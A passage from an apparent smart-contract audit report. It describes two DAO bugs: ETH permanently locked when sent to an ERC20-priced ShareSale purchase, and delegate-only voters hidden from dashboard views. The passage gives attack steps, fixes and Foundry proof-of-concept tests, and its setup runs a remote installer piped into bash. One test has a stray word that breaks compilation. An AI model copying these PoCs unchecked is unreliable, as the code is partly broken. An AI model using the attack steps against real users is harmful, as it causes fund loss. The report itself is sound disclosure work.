5. **[src/peripheral/ShareSale.sol:86](../src/peripheral/ShareSale.sol#L86)**

   ```solidity
   IMoloch(dao).spendAllowance(s.token, amount);
   ```

   The function continues successfully after the ERC20 transfer instead of reverting, so the ETH is not rolled back.

6. **[src/peripheral/ShareSale.sol:97](../src/peripheral/ShareSale.sol#L97)**

   ```solidity
   safeTransfer(tokenAddr, msg.sender, amount);
   ```

   The buyer receives the purchased asset and the transaction returns successfully, finalizing the accidental ETH transfer into the `ShareSale` contract.

#### Exploit Analysis

##### Attack Narrative
A malicious frontend operator, wallet plugin, router, or copy-trading tool targets users participating in a DAO sale that is configured to accept an ERC20 payment token. The attacker prepares a normal-looking `ShareSale.buy()` transaction, but sets a nonzero `value` field even though the sale's `payToken` is an ERC20.

Because `ShareSale.buy()` is `payable`, the EVM accepts the ETH. The ERC20 branch of the function then pulls the ERC20 payment, spends the DAO allowance, and transfers the purchased shares or loot to the buyer without ever checking or refunding `msg.value`. The transaction therefore succeeds, but the extra ETH remains stuck on the `ShareSale` contract permanently because the contract has no withdrawal or rescue path.

##### Prerequisites
- **Attacker Control/Position:** Control over transaction construction, a malicious frontend, wallet plugin, router, or the victim making a mistaken direct call
- **Required Access/Placement:** Unauthenticated user / external integration control
- **User Interaction:** Required — the victim must sign and submit a `buy()` transaction with nonzero `value`
- **Privileges/Configuration Required:** A DAO must have configured `ShareSale` with `payToken != address(0)` so the ERC20 payment path is active
- **Knowledge Required:** The attacker must know the target DAO sale address and that the configured `payToken` is an ERC20
- **Attack Complexity:** Low — a single transaction with an unexpected `value` field is sufficient

##### Attack Steps
1. Identify a DAO sale configured through `ShareSale.configure(..., payToken, ...)` where `payToken` is a nonzero ERC20 address.
2. Ensure the victim has approved the ERC20 spend needed for the intended purchase.
3. Submit `ShareSale.buy(dao, amount)` with a nonzero `msg.value` even though the sale is ERC20-denominated.
4. Observe that `safeTransferFrom(s.payToken, dao, cost)` executes, the purchase completes, and the buyer receives shares/loot.
5. Observe that the attached ETH remains on `ShareSale` and cannot be withdrawn through any function in the contract.

##### Impact Breakdown
- **Confirmed Impact:** ETH attached to successful ERC20 purchases is irrecoverably locked on `ShareSale`, causing direct user fund loss.
- **Potential Follow-On Impact:** If a popular frontend or wallet integration is compromised or malicious, multiple users can be induced to burn ETH in otherwise successful sale purchases. The code does not support direct attacker extraction of the trapped ETH.
- **Confidentiality:** None — no secret data is exposed.
- **Integrity:** None — the attacker does not gain unauthorized control over DAO state or other users' balances.
- **Availability:** Low — the victim loses availability of the attached ETH permanently.

#### Recommended Fix

Reject any nonzero `msg.value` whenever the sale is configured to take an ERC20 payment token. This matches the behavior already implemented in `Moloch.buyShares()` and prevents silent ETH loss.

Before:
```solidity
} else {
    safeTransferFrom(s.payToken, dao, cost);
}
```

After:
```solidity
error UnexpectedETH();

...

} else {
    if (msg.value != 0) revert UnexpectedETH();
    safeTransferFrom(s.payToken, dao, cost);
}
```

If the project wants to tolerate accidental value attachment instead of reverting, it must explicitly refund `msg.value` before continuing. Reverting is safer because it avoids any ambiguity around partial execution and matches the existing core sale path.

##### Security Principle
Payment modality must be validated against the configured payment asset. A contract that accepts both ETH and ERC20 payments should reject impossible combinations early so user-controlled value cannot become orphaned in contract storage/balance.

##### Defense in Depth
- Add a regression test covering `payToken != address(0)` with `msg.value > 0`, expecting a revert.
- Keep the public dapp and any helper scripts from setting a transaction `value` field unless `payToken == address(0)`.
- Optionally add a DAO-governed rescue function for unexpected ETH balances if the project accepts the associated trust tradeoff.

##### Verification Guidance
- Add a test proving that an ERC20-configured sale reverts on any nonzero `msg.value`.
- Add a test proving that valid ERC20 purchases with `msg.value == 0` still succeed and transfer the expected ERC20 payment.
- Add a test proving that ETH-configured sales still accept exact or excess ETH and refund overpayment correctly.

#### Reproduction

##### Environment
- **OS:** any
- **Dependencies:**
```bash
curl -L https://foundry.paradigm.xyz | bash
foundryup
```
- **Target Setup:**
```bash
cd "$(git rev-parse --show-toplevel)"
forge build
```

##### Runnable PoC
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ShareSale} from "../src/peripheral/ShareSale.sol";

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract MockMoloch {
    mapping(address => mapping(address => uint256)) public allowance;
    MockERC20 internal immutable sharesToken;

    constructor(MockERC20 shares_) {
        sharesToken = shares_;
    }

    receive() external payable {}

    function setAllowance(address spender, address token, uint256 amount) external {
        allowance[token][spender] = amount;
    }

    function spendAllowance(address token, uint256 amount) external {
        allowance[token][msg.sender] -= amount;
        sharesToken.transfer(msg.sender, amount);
    }

    function shares() external view returns (address) {
        return address(sharesToken);
    }

    function loot() external view returns (address) {
        return address(sharesToken);
    }
}

contract LockedEtherShareSalePoC is Test {
    ShareSale internal sale;
    MockERC20 internal payToken;
    MockERC20 internal sharesToken;
    MockMoloch internal dao;

    address internal buyer = address(0xB0B);

    function setUp() public {
        sale = new ShareSale();
        payToken = new MockERC20();
        sharesToken = new MockERC20();
        dao = new MockMoloch(sharesToken);

        sharesToken.mint(address(dao), 10e18);
        dao.setAllowance(address(sale), address(sharesToken), 10e18);

        vm.prank(address(dao));
        sale.configure(address(sharesToken), address(payToken), 1e18, 0);

        vm.deal(buyer, 5 ether);
        payToken.mint(buyer, 100e18);
        vm.prank(buyer);
        payToken.approve(address(sale), type(uint256).max);
    }

    function test_StrayEthGetsStuckOnERC20Sale() public {
        uint256 saleEthBefore = address(sale).balance;
        uint256 buyerEthBefore = buyer.balance;

        vm.prank(buyer);
        sale.buy{value: 1 ether}(address(dao), 10e18);

        assertEq(address(sale).balance - saleEthBefore, 1 ether);
        assertEq(buyer.balance, buyerEthBefore - 1 ether);
        assertEq(payToken.balanceOf(address(dao)), 10e18);
        assertEq(sharesToken.balanceOf(buyer), 10e18);
    }
}
```

##### Steps
1. **Save the PoC as a Foundry test**
```bash
cat > test/LockedEtherShareSale.t.sol <<'EOF'
[PASTE THE FULL TEST ABOVE]
EOF
```
- Expected: the test file is written successfully.
2. **Run the PoC**
```bash
forge test --match-test test_StrayEthGetsStuckOnERC20Sale -vv
```
- Expected: the test passes and shows that the ERC20 purchase succeeded while `address(sale).balance` increased by `1 ether`.

##### Verification
Confirm that the test assertions all pass, especially:
- `address(sale).balance - saleEthBefore == 1 ether`
- `buyer.balance == buyerEthBefore - 1 ether`
- `payToken.balanceOf(address(dao)) == 10e18`
- `sharesToken.balanceOf(buyer) == 10e18`

##### Outcome
The attacker does not receive the ETH directly; instead, the victim's extra ETH is irreversibly trapped in `ShareSale` while the ERC20 purchase still completes normally. This makes the bug a reliable user-funds-burn vector for any actor who can influence the signed transaction parameters.

</details>

---

## Low

<details>
<summary><strong>28. Delegate-only governance accounts disappear from personalized DAO dashboards</strong></summary>

> **Review: Valid novel finding (same root cause as #26). Low severity accepted.** See #26 review. Delegate-only accounts missing from personalized views is the same MolochViewHelper omission. UX-layer impact only, no fund loss. Not a Moloch.sol core finding. **Severity: Low (peripheral, UX impact).**

**Winfunc ID:** `15`

**CVSS Score:** `3.5`

**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N`

**Vulnerability Type:** `CWE-451: User Interface (UI) Misrepresentation of Critical Information`

**Source Location:** `src/Moloch.sol:1228:delegate()`

**Sink Location:** `src/peripheral/MolochViewHelper.sol:570:getUserDAOsFullState()`

#### Summary

An attacker can route delegated voting power to an address with no shares, loot, or badge seat in the governance dashboard path, leading to confirmed misrepresentation of that address's DAO participation and voting status in the official UI.

#### Root Cause

`src/peripheral/MolochViewHelper.sol` filters `getUserDAOs()` and `getUserDAOsFullState()` by `shares.balanceOf(user)`, `loot.balanceOf(user)`, or `badges.seatOf(user)`, and skips the DAO entirely when all three are zero. In contrast, `src/Moloch.sol::castVote()` authorizes voting by `shares.getPastVotes(msg.sender, snap)`, so a delegate-only address with zero token balances and no seat can still be a fully authorized voter. The helper even fetches `IShares.getVotes(user)` later in the function, but never uses that governance-relevant signal to decide inclusion.

#### Impact

###### Confirmed Impact
A delegate-only governance operator can successfully vote on-chain while `getUserDAOsFullState()` omits the DAO from the personalized dashboard data consumed by the official dapp. When the dapp opens the DAO from the general gallery instead, it sets `currentDAO.member = null`, hiding member-specific state for that voter.

###### Potential Follow-On Impact
This omission can mislead operators and observers about who is able to participate in governance, especially when delegated voting is intentionally routed through unseated addresses. Related view-helper paths also derive per-proposal voter UX from seat-based member enumeration, which can further cause missing vote receipts or stale vote-state displays for delegate-only voters; this follow-on effect depends on the specific UI path exercised.

#### Source-to-Sink Trace

1. **[src/Moloch.sol:1228](../src/Moloch.sol#L1228)**

   ```solidity
   function delegate(address delegatee) public { _delegate(msg.sender, delegatee); }
   ```

   A share holder can route governance power to an arbitrary delegate address, including one with no shares, no loot, and no badge seat.

2. **[src/Moloch.sol:369](../src/Moloch.sol#L369)**

   ```solidity
   uint96 weight = uint96(shares.getPastVotes(msg.sender, snap));
   ```

   Voting authorization is based on delegated snapshot voting power, not on direct token ownership or badge-seat possession.

3. **[src/peripheral/MolochViewHelper.sol:546](../src/peripheral/MolochViewHelper.sol#L546)**

   ```solidity
   if (IShares(sharesToken).balanceOf(user) != 0 || ILoot(lootToken).balanceOf(user) != 0 || IBadges(badgesToken).seatOf(user) != 0) { ++matchCount; }
   ```

   The first pass that sizes the result set ignores delegated voting power and only treats balances or seats as inclusion criteria.

4. **[src/peripheral/MolochViewHelper.sol:570](../src/peripheral/MolochViewHelper.sol#L570)**

   ```solidity
   if (sharesBal == 0 && lootBal == 0 && seatId == 0) { continue; }
   ```

   The second pass drops the DAO entirely for delegate-only users, guaranteeing omission from the returned personalized dashboard state.

5. **[src/peripheral/MolochViewHelper.sol:580](../src/peripheral/MolochViewHelper.sol#L580)**

   ```solidity
   uint256 votingPower = IShares(sharesToken).getVotes(user);
   ```

   The helper already queries current voting power, confirming the relevant governance signal exists but is not used to decide inclusion.

6. **[dapp/Majeur.html:13836](../dapp/Majeur.html#L13836)**

   ```solidity
   return await viewHelper.getUserDAOsFullState(userAddr, 0, 10, 0, 20, 0, 20, treasuryTokens);
   ```

   The official dapp consumes the filtered helper output to populate the connected user's DAO dashboard.

7. **[dapp/Majeur.html:20441](../dapp/Majeur.html#L20441)**

   ```solidity
   currentDAO = { dao: dao, member: null };
   ```

   If the DAO was omitted from the user-scoped helper results, opening it from the general gallery strips member-specific state in the dashboard.

#### Exploit Analysis

##### Attack Narrative
A governance participant who controls voting power, or coordinates with token holders willing to delegate to them, creates a fresh delegate address that owns no shares, no loot, and no badge seat. They then receive delegated voting power through `Shares.delegate()` or split delegation and use that address to vote on proposals, which succeeds because `Moloch.castVote()` checks past delegated votes rather than token ownership.

When that same address is used with the official dapp, the portfolio/dashboard path calls `getUserDAOsFullState()` and receives no entry for the DAO because the helper only treats token ownership or badge seats as membership. The dapp therefore omits the DAO from personalized listings and, when the DAO is opened from the general gallery instead, clears member-specific state by setting `currentDAO.member = null`.

##### Prerequisites
- **Attacker Control/Position:** Control of a delegate-only address plus delegated governance power routed to it
- **Required Access/Placement:** Authenticated governance participant / token holder / coordinated delegate operator
- **User Interaction:** Required — token holders must delegate voting power to the operator address if the attacker does not already control the voting shares
- **Privileges/Configuration Required:** Standard delegation must be enabled, which is core protocol functionality
- **Knowledge Required:** DAO address and awareness that the official dapp relies on `getUserDAOsFullState()` for personalized views
- **Attack Complexity:** Low — delegation to a fresh address is a normal supported flow and no race or unusual chain conditions are required

##### Attack Steps
1. Acquire or control voting shares, or persuade holders to delegate to an operator address with zero shares/loot/seat.
2. Delegate to that address via `Shares.delegate()` or `setSplitDelegation()`.
3. Open or locate a live proposal and call `castVote()` from the delegate-only address; the vote succeeds because the snapshot check uses delegated past votes.
4. Connect the delegate-only address to the dapp or call `getUserDAOsFullState()` directly.
5. Observe that the DAO is absent from personalized dashboard results; if opened via the all-DAOs gallery, member-specific state is missing because `currentDAO.member` is set to `null`.

##### Impact Breakdown
- **Confirmed Impact:** Personalized governance/dashboard views can omit a real on-chain voter, causing the official UI to misrepresent participation and member state.
- **Potential Follow-On Impact:** Depending on the exact UI path, related seat-based voter enumeration can also leave delegate-only voters out of vote receipt and prior-vote displays, increasing operator confusion and reducing governance transparency.
- **Confidentiality:** None — no secret data is exposed.
- **Integrity:** Low — governance-related UI state is materially inaccurate for delegate-only voters.
- **Availability:** None — on-chain voting remains available.

#### Recommended Fix

Update the helper's inclusion logic to treat delegated voting power as a governance-relevant membership signal, or return explicit flags that distinguish portfolio membership from governance eligibility. At minimum, both `getUserDAOs()` and `getUserDAOsFullState()` should include DAOs when `IShares(sharesToken).getVotes(user) != 0`.

Before:
```solidity
if (
    IShares(sharesToken).balanceOf(user) != 0 || ILoot(lootToken).balanceOf(user) != 0
        || IBadges(badgesToken).seatOf(user) != 0
) {
    ++matchCount;
}
...
if (sharesBal == 0 && lootBal == 0 && seatId == 0) {
    continue;
}
```

After:
```solidity
uint256 votingPower = IShares(sharesToken).getVotes(user);
bool hasPortfolioPosition =
    IShares(sharesToken).balanceOf(user) != 0
    || ILoot(lootToken).balanceOf(user) != 0
    || IBadges(badgesToken).seatOf(user) != 0;
bool hasGovernancePower = votingPower != 0;

if (hasPortfolioPosition || hasGovernancePower) {
    ++matchCount;
}
...
if (!hasPortfolioPosition && !hasGovernancePower) {
    continue;
}
```

If UI consumers need to distinguish “owns tokens” from “can vote,” add explicit booleans such as `hasPortfolioPosition` and `hasGovernancePower` to the returned structs instead of overloading the meaning of `member`.

##### Security Principle
Off-chain authorization and governance UX must mirror the same trust predicate enforced on-chain. If on-chain voting depends on delegated voting power, user-facing governance views must not infer eligibility solely from token ownership or seat possession.

##### Defense in Depth
- Add a dedicated helper/API field for governance eligibility so frontends never infer it from balances alone.
- In the dapp, avoid setting `currentDAO.member = null` when `member.votingPower > 0` or when a dedicated governance-eligibility flag is true.
- Avoid using seat-limited voter lists as exhaustive truth for per-user vote status; fall back to direct `hasVoted()` checks when necessary.

##### Verification Guidance
- Add a regression test where a zero-balance, zero-seat delegate address receives delegated votes and confirm both helper functions include the DAO.
- Verify a delegate-only address can connect to the dapp, see the DAO in personalized views, and retain member/governance state after `refreshCurrentDAO()`.
- Verify ordinary non-members with zero balances, zero seats, and zero votes are still excluded.

#### Reproduction

##### Environment
- **OS:** any
- **Dependencies:**
```bash
curl -L https://foundry.paradigm.xyz | bash
foundryup
git submodule update --init --recursive
```
- **Target Setup:**
```bash
forge test -vv --match-path test/DelegateOnlyVoterHidden.t.sol
```

##### Runnable PoC
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Renderer} from "../src/Renderer.sol";
import {Moloch, Shares, Loot, Badges, Summoner, Call} from "../src/Moloch.sol";
import {UserDAOLens} from "../src/peripheral/MolochViewHelper.sol";
import {TestViewHelper, MockDAICO} from "./MolochViewHelper.t.sol";

contract DelegateOnlyVoterHiddenTest is Test {
    Summoner summoner;
    Moloch dao;
    Shares shares;
    Loot loot;
    Badges badges;
    TestViewHelper helper;
    MockDAICO daico;
    Renderer renderer;

    address alice = address(0xA11CE);
    address delegateOnly = address(0xD311);
    address target = address(0xBEEF);

    function setUp() public {
        renderer = new Renderer();
        summoner = new Summoner();
        daico = new MockDAICO();
        helper = new TestViewHelper(address(summoner), address(daico));

        address[] memory holders = new address[](0);
        uint256[] memory amounts = new uint256[](0);
        dao = summoner.summon(
            "Test DAO",
            "TEST",
            "ipfs://dao",
            5000,
            true,
            address(renderer),
            bytes32(0),
            holders,
            amounts,
            new Call[](0)
        );

        shares = dao.shares();
        loot = dao.loot();
        badges = dao.badges();

        vm.prank(address(dao));
        shares.mintFromMoloch(alice, 60e18);
        vm.roll(block.number + 1);
    }

    function test_delegateOnlyVoterIsHiddenFromUserDashboard() public {
        // Alice delegates all current voting power to an address with no shares/loot/seat.
        vm.prank(alice);
        shares.delegate(delegateOnly);
        vm.roll(block.number + 1);

        assertEq(shares.balanceOf(delegateOnly), 0);
        assertEq(loot.balanceOf(delegateOnly), 0);
        assertEq(badges.seatOf(delegateOnly), 0);
        assertEq(shares.getVotes(delegateOnly), 60e18);

        // Open a proposal and vote from the delegate-only address.
        bytes memory data = abi.encodeWithSignature("setValue(uint256)", 123);
are        uint256 id = dao.proposalId(0, target, 0, data, bytes32(0));

        vm.prank(alice);
        dao.openProposal(id);

        vm.prank(delegateOnly);
        dao.castVote(id, 1);

        (uint96 forVotes,,) = dao.tallies(id);
        assertEq(uint256(forVotes), 60e18); // vote was accepted on-chain

        // The helper still hides the DAO from the delegate-only voter.
        address[] memory treasuryTokens = new address[](0);
        UserDAOLens[] memory result = helper.getUserDAOsFullState(
            delegateOnly,
            0,
            10,
            0,
            10,
            0,
            10,
            treasuryTokens
        );

        assertEq(result.length, 0, "delegate-only voter should not be hidden");
    }
}
```

##### Steps
1. **Create a DAO and mint shares to a holder**
- Expected: the holder has voting power and the delegate-only address has none initially.
2. **Delegate the holder's shares to a fresh address with zero shares, zero loot, and no badge seat**
- Expected: `shares.getVotes(delegateOnly)` becomes non-zero while all ownership/seat checks remain zero.
3. **Open a proposal and cast a vote from the delegate-only address**
- Expected: `castVote()` succeeds and tallies increase, proving the address is governance-authorized.
4. **Call `getUserDAOsFullState(delegateOnly, ...)`**
- Expected: the returned array is empty even though the address just voted successfully.

##### Verification
Confirm all of the following in the test output:
- `shares.balanceOf(delegateOnly) == 0`
- `loot.balanceOf(delegateOnly) == 0`
- `badges.seatOf(delegateOnly) == 0`
- `shares.getVotes(delegateOnly) > 0`
- `dao.castVote()` from `delegateOnly` succeeds
- `helper.getUserDAOsFullState(delegateOnly, ...)` returns length `0`

##### Outcome
The attacker-controlled delegate-only governance address remains fully able to vote on-chain, but the official user-scoped dashboard data excludes the DAO entirely. In practice, that hides governance participation from the dapp's personalized views and can mislead operators or observers about who is actively empowered to govern.

</details>
